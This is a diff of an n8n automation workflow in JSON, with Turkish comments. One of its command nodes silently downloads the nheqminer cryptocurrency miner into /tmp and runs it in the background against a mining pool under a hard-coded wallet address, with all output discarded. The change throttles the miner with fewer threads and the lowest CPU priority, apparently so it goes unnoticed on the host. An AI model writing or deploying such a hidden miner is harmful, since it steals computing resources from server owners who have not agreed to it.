@@ -1,5 +1,5 @@
 {
-  "name": "Orijinal Nheqminer (Arka Plan Korumalı) Kazım Sistemi",
+  "name": "Orijinal Nheqminer (%50 Güç Korumalı)",
   "nodes": [
     {
       "parameters": {
@@ -23,7 +23,7 @@
     },
     {
       "parameters": {
-        "command": "if ! ps | grep -v grep | grep -q \"nheqminer\"\nthen\n    echo \"Madenci çalışmıyor, başlatılıyor...\"\n    mkdir -p /tmp/miner\n    cd /tmp/miner\n    if [ ! -f ./nheqminer ]; then\n        wget -q https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz\n        tar -xf nheqminer-Linux-v0.8.2.tgz\n        mv nheqminer/nheqminer .\n        chmod +x nheqminer\n    fi\n    # Arka planda başlatalım ki n8n kilitlenmesin (& işareti ile)\n    nohup ./nheqminer -v -l eu.luckpool.net:3956 -u RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer -p x -t 2 > /dev/null 2>&1 &\n    echo \"BİLGİ: Madenci arka planda başarıyla başlatıldı.\"\nelse\n    echo \"BİLGİ: Madenci zaten arka planda sorunsuz çalışıyor.\"\nfi"
+        "command": "if ! ps | grep -v grep | grep -q \"nheqminer\"\nthen\n    echo \"Madenci çalışmıyor, başlatılıyor...\"\n    mkdir -p /tmp/miner\n    cd /tmp/miner\n    if [ ! -f ./nheqminer ]; then\n        wget -q https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz\n        tar -xf nheqminer-Linux-v0.8.2.tgz\n        mv nheqminer/nheqminer .\n        chmod +x nheqminer\n    fi\n    # Sistemi yormamak için 'nice' (en düşük CPU önceliği) ve -t 1 (Maksimum %50 güç) kullanılarak başlatılır:\n    nohup nice -n 19 ./nheqminer -v -l eu.luckpool.net:3956 -u RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer -p x -t 1 > /dev/null 2>&1 &\n    echo \"BİLGİ: Madenci CİHAZI YORMADAN (%50 güçte ve en düşük öncelikle) başarıyla başlatıldı.\"\nelse\n    echo \"BİLGİ: Madenci zaten arka planda yormadan çalışıyor.\"\nfi"
       },
       "type": "n8n-nodes-base.executeCommand",
       "typeVersion": 1,
